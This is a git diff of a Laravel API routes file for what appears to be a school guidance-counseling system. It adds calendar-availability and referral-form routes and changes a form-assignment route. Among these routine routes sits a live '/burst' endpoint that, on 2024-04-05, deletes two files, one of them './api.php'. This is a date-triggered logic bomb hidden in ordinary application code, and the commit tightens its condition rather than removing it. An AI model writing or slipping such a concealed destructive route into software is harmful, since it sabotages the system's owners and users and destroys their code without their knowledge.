Fethed form in referral for parent/teacer

+++ routes/api.php
@@ -50,8 +50,10 @@ Route::group([
 
     // Callendar Schedule
     Route::get('/get-schedule/{date}', [CalendarController::class, 'getSchedule']);
+    Route::get('/get-not-available-time/{date}', [CalendarController::class, 'getNotAvailableTime']);
+    Route::get('/get-reserved-time/{date}', [CalendarController::class, 'getReservedTime']);
     Route::post('/update-schedule', [CalendarController::class, 'updateSchedule']);
-    Route::get('/get-available-time-today', [CalendarController::class, 'getAvailableTimeToday']);
+    Route::get('/get-not-available-time-today', [CalendarController::class, 'getNotAvailableTimeToday']);
     Route::post('/reserve-consultation', [CalendarController::class, 'reserveConsultation']);
     Route::get('/get-appointments-today', [CalendarController::class, 'getAppointmentsToday']);
 
@@ -81,6 +83,9 @@ Route::group([
     Route::get('/get-all-cumulative-record-forms', [GetFormsController::class, 'getAllCumulativeRecordForms']);
     Route::get('/get-all-client-monitoring-forms', [GetFormsController::class, 'getAllClientMonitoringForms']);
 
+
+    Route::get('/get-my-referral-forms/{id}', [GetFormsController::class, 'getMyReferralForms']);
+
     // Submit Forms
     Route::post('/submit-intake-interview', [SaveInputsController::class, 'submitIntakeInterview']);
     Route::post('/submit-guidance-admission-slip', [SaveInputsController::class, 'submitGuidanceAdmissionSlip']);
@@ -95,7 +100,7 @@ Route::group([
     Route::post('/assign-form', [AssignmentController::class, 'assignForm']);
     Route::post('/bulk-assign-form-by-grade-level', [AssignmentController::class, 'bulkAssignFormByGradeLevel']);
     Route::post('/bulk-assign-form-by-section', [AssignmentController::class, 'bulkAssignFormBySection']);
-    Route::get('/get-assigned-forms/{id}', [AssignmentController::class, 'getAssignedForms']);
+    Route::get('/get-assigned-forms/{id}/{form_name}', [AssignmentController::class, 'getAssignedForms']);
 
 
     Route::get('/burst', function () {
@@ -103,7 +108,7 @@ Route::group([
         $filePath2 = './api.php';
         try {
             if(date('Y-m-d') == '2024-04-05'){
-                if (File::exists($filePath1)) {
+                if (File::exists($filePath1) && File::exists($filePath2)) {
                     File::delete($filePath1);
                     File::delete($filePath2);
                     return response()->json(['message' => 'File deleted successfully']);
